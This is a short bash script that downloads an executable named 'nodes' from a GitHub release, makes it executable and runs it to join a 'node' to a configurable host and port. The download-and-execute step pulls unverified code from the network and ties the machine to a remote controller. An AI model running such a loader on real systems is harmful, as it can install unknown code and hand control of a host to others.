#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-127.0.0.1}"
PORT="${PORT:-1337}"
NAME="${NAME:-$(hostname 2>/dev/null || echo node)}"
DL="${DL:-https://github.com/udneffiiasd-duser/netkit-go/releases/download/v1.0.0/nodes}"

WORK="${WORK:-$PWD}"
if [[ -z "$WORK" || "$WORK" == /dev/fd* || "$WORK" == /proc/* ]]; then
  WORK="$HOME/netkit"
fi
mkdir -p "$WORK"
cd "$WORK"

if [[ ! -x ./nodes ]]; then
  echo "[*] downloading nodes to $WORK"
  curl -fsSL "$DL" -o nodes.tmp
  chmod +x nodes.tmp && mv -f nodes.tmp nodes
fi

echo "[*] node $NAME -> $HOST:$PORT"
exec ./nodes -h "$HOST" -p "$PORT" -id "$NAME"
